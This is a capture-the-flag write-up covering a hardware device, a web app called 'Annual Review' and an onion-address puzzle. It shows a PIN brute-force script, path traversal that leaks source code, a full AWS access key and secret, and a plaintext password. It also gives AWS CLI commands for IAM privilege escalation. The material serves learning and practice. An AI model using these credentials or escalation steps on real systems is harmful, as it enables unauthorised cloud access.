## Personal assistant device

### Description
Each table was presented with a small "Personal assistant device" that seemed to have no other purpose than to display the current time along with an "inspirational corporate quote".

![PAD](https://i.ibb.co/kqNfzQx/pad.jpg)
### Solution
Upon further inspection, we noticed a couple of things. The screen seemed to respond to touch by emitting a "Beep" when touched. Furthermore, an SD card was connected to the device. 
Inserting the SD card in a computer shows a `256MB` `FAT32` formatted SD card with 3 files on it. 2 pictures of a 3D schematic of the device along with a user manual pdf. The user manual pdf did not reveal any useful information neither did the images. However, the mount point of the SD card was `/NSEC-VOL`.
#### Flag 1
When plugged into a computer, running `lsusb` shows us that the device is detected as a `ID 1a86:7523 QinHeng Electronic CH340 Serial converter`. After searching on Google, it is possible to communicate with the device using `minicom` at a baud rate of `115200`. 

Launching `minicom` on `/dev/ttyUSB0` with a baud rate of `115200`, we get an established communication between the computer and the PAD. Running `help` command gives us one available command. `debug [enable|disable|status] <pin>`.

As we do not know the pin, we will attempt to brute-force it with the following script:
```py
    import time
    import pyautogui
    
    def type_and_enter(text):
        pyautogui.write(text)
        pyautogui.press('enter')
    
    # Delay for a few seconds before typing
    time.sleep(5)
    
    # Iterate through PINs from 0000 to 9999
    for pin in range(0,10000):
        pin_text = str(pin).zfill(4)  # Zero-fill the PIN to always have four digits
        type_and_enter("debug enable " + pin_text)
        time.sleep(0.05)  # Add a small delay between each iteration
```
   After running for about 13 minutes, we get the following message:
```
   nsec> debug enable 9583
   Enabled debug mode. Restart for changes to take effect.
   Congratulations, here is your FLAG-{590b65680b892dae31181bdfcfcf33a3}
```
#### Flag 2
After restarting the device, we notice that during the loading sequence, multiple messages appear such as "Loading Wifi", "Loading Meshes" and for a brief instant a flag seems to appear. Restarting the device and filming the boot sequence shows for a brief instant the following: `FLAG-{so_fast_84d45cceb0360957}` We have now found 2 out of 8 flags in the series. 

#### Flag 3
After the boot sequence is completed, we are presented with a new screen
![debug mode](https://i.ibb.co/wBZxfkD/IMG20230520191207.jpg)
New commands are also available through `minicom`:
```
nsec> help
help 
	Print the list of registered commands 
debug <cmd> <pin> 
	Enable debug mode 
		<cmd> what to do, either 'enable' or 'disable' 
		<pin> secure pin for unlocking debug mode

	Set log level for all tags or a specific tag. 
	Persistent across reboots. Use 'log_level * none' to reset all saved levels. 
	Levels other than debug/verbose persist across restarts. 
		<tag|*> Log tag to set the level for, or * to set for all tags <none|error|warn|debug|verbose> Log level to set. 
		Abbreviated words are accepted.

		<pattern> pattern to be displayed 
		<brightness> neopixels brightness [0-255] 
		<color> neopixels brightness [0x000000-0xffffff] 
flag 
	Do the thing
```
Obviously, presented with a flag command, this was the first command attempted and here's the result:
```
Writing /flags/data/flag.txt ...Failed to open file for writing (directory may not exist?) 
Command returned non-zero error code: 0xffffffff (ESP_FAIL)
```
Since the SD card's mount point is `/NSEC-VOL` and the flag command tries to write to `/flags/data/flag.txt`, we plugged the SD card into a computer and running the following commands:
```
sudo umount /dev/sda1
sudo mkfs.vfat -n flags /dev/sda1
sudo mount /dev/sda1 /flags`
cd /flags
sudo touch data/flag.txt
sudo chmod 777 data/flag.txt
```
This recreates what the flag commands expects and plugging the SD card back into the PAD and running it again shows:
```
writing /flags/flag.txt ... OK
nsec>
```

Looking at the created text file, we have the following: `FLAG-{5418f0cfd7d67de7cbafbdffd29f3f3d}` (3/8).

#### Flag 4
Since we're looking for a flag, we tried setting the log level to `log_level flag info`.
```
nsec> log_level flag info 
nsec> restart

```
Unfortunately when time ran up, we only managed to retrieve 4 out of 8 flags on the PAD.

## Annual Review

### Description
Annual review is a platform for employee's annual review scores. We are given our own employee's credentials 120875ABAB and our password to log into the platform. 
We can see on the platform that we have a low score of 2/5 and we must improve our review score. 
There is a however a button linking us to a guide on how the annual review platform work, etc. The link looked like: http://54.166.135.177:8080/employee-review/app.php?file=/var/www/html/guide.md
This hints us that there might be a [file path traversal](https://cwe.mitre.org/data/definitions/35.html) vulnerability within the system. 
### Solution
#### Flag 1
Changing the link to `/etc/passwd` results in a blank page. We can assume that we do not have permission to view files outside of `/var/www/html`. Changing it to `/var/www/html/app.php` leaks us the source code of the `app.php` file. In it, we see that it includes another file from `libs/dynamo.php`. Leaking the `dynamo.php` contents shows the following:
```php
<?php

  // flag-d19650aa911acb7c130aa380601d169d3bd08ab4
  require_once __DIR__ . '/vendor/autoload.php';

  class Db {
    private $tblLogin = 'GOD_LoginEmployee';
    private $tblReview = 'GOD_ReviewEmployee';
    private $db;
    function __construct() {
      $sdk = new Aws\Sdk([
        'region'   => 'us-east-1',
        'version'  => 'latest',
        'credentials' => [
          'key'    => 'AKIA27KNLIQB44ZNJB3B',
          'secret' => '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',
        ]
      ]);
    function login($employee_id, $password)...
    function get_review($employee_id)...
    function get_reviews()...
?>
...
```
#### Flag 2
The secret key to the aws being leaked, we can forge our own `dynamo.php` and write a PHP function as such:
```php
function print_all_tables() {
        $result = $this->db->listTables();
        $tables = $result->get('TableNames');
        foreach ($tables as $table) {
            echo "Table: $table\n";
            $scanParams = [
                'TableName' => $table,
            ];
            $result = $this->db->scan($scanParams);
            $items = $result->get('Items');
            foreach ($items as $item) {
                echo "Item: ";
                foreach ($item as $key => $value) {
                    $attributeName = $key;
                    $attributeValue = reset($value);
                    echo "$attributeName: $attributeValue | ";
                }
                echo "\n";
            }
            echo "\n";
        }
    }
```
Running our own local PHP webserver with the modified `dynamo.php` version and calling `print_all_tables()` gives out the following output:
```

Item: EmployeeId: 939932RQJX | Password: mlOfN2nSe8TljsloxByx |

```
#### Flag 3
Logging in as `hr_913126IBKU` we see all the reviews left for employees. One review left for employee `978273KULS` is:
`You have written solid documentation! (link to a markdown file).`

Downloading the [markdown file](https://pastebin.com/ifQMqnU3) gives us `flag-7fa969573c3ff2190e892095166cf71635eca0be`.
Following through the instructions of downloading, installing and configuring AWS CLI with the secret access key provided to us in the markdown file, we can run the following command to get a list of roles our AWS user can assume:
`aws iam list-roles --profile svc_iam`

#### Flag 4
The role `GOD_IAM-Manager-Role` can be assumed by `GOD_svc_iam`:
```
"Statement": [
    {
        "Effect": "Allow",
        "Principal": {
            "AWS": "arn:aws:iam::274186580685:user/GOD_svc_iam"
        },
        "Action": "sts:AssumeRole"
    }
]
```

```
aws iam list-role-policies --role-name GOD_IAM-Manager-Role --profile svc_iam
aws iam get-role-policy --role-name GOD_IAM-Manager-Role --policy-name GOD_AttachCustomPolicies --profile svc_iam
```

The role `GOD_IAM-Manager-Role` has the role policy `GOD_AttachCustomPolicies` allowing to attach to a user the managed policies matching the pattern `GOD_Custom*`.

```
aws iam list-policies --profile svc_iam
aws iam get-policy-version --policy-arn arn:aws:iam::274186580685:policy/GOD_CustomDebugEmployeeReview --version-id v1 --profile svc_iam
```
The managed policy `GOD_CustomDebugEmployeeReview` awards privileges to get and invoke a lambda named `GOD_DebugEmployeeApp`.

```
aws sts assume-role --role-arn 'arn:aws:iam::274186580685:role/GOD_IAM-Manager-Role' --role-session-name iam --profile svc_iam
```
By assuming the role `GOD_IAM-Manager-Role`, we can get an access key as the role.
```
aws iam attach-user-policy --user-name GOD_svc_iam --policy-arn arn:aws:iam::274186580685:policy/GOD_CustomDebugEmployeeReview --profile god_iam_manager
```
With this access key, we can attach the managed policy to `GOD_svc_iam` (our initial user profile) and then retrieve the Lambda code for: `flag-5aac692710f20e627fc5792d9c06f958238d0f51`.
```
aws lambda get-function --function-name 'GOD_DebugEmployeeApp' --region us-east-1 --profile svc_iam
```
The Lambda has the function `get_private_key` which gets the key from Secrets Manager. 

However as it was not directly accessible, we were unable to proceed due to time running short and stopped at the fourth flag.

## Onion
### Description
A web server is hosted at a particular onion address that we do not know. We are given a private key and need to find the onion URL. 
### Solution
First, we need to get the public key from the private key using openssl:
```
$ openssl pkey -in private.pem -pubout -text
-----BEGIN PUBLIC KEY-----
MCowBQYDK2VwAyEAh5JQwH58BjjJirQ9ewFXLkryLZe+0mzlyTrZFQGO6ts=
-----END PUBLIC KEY-----
ED25519 Public-Key:
pub:
    87:92:50:c0:7e:7c:06:38:c9:8a:b4:3d:7b:01:57:
    2e:4a:f2:2d:97:be:d2:6c:e5:c9:3a:d9:15:01:8e:
    ea:db
```
From the public key, we can make a Python script to encode it in base32 and sha256 as such:
```py
from hashlib import sha3_256
from base64 import b32encode
if __name__ == '__main__':a
    str = "87:92:50:c0:7e:7c:06:38:c9:8a:b4:3d:7b:01:57:2e:4a:f2:2d:97:be:d2:6c:e5:c9:3a:d9:15:01:8e:ea:db"
    public_bytes = bytes.fromhex(str.replace(':', ''))
    VERSION = b'\x03'
    checksum = sha3_256(b'.onion checksum' + public_bytes + VERSION).digest()[:2]
    onion = b32encode(public_bytes + checksum + VERSION).lower() + b'.onion'
    print(onion)
```

Flag: `q6jfbqd6pqddrsmkwq6xwakxfzfpelmxx3jgzzojhlmrkamo5ln6twad.onion`
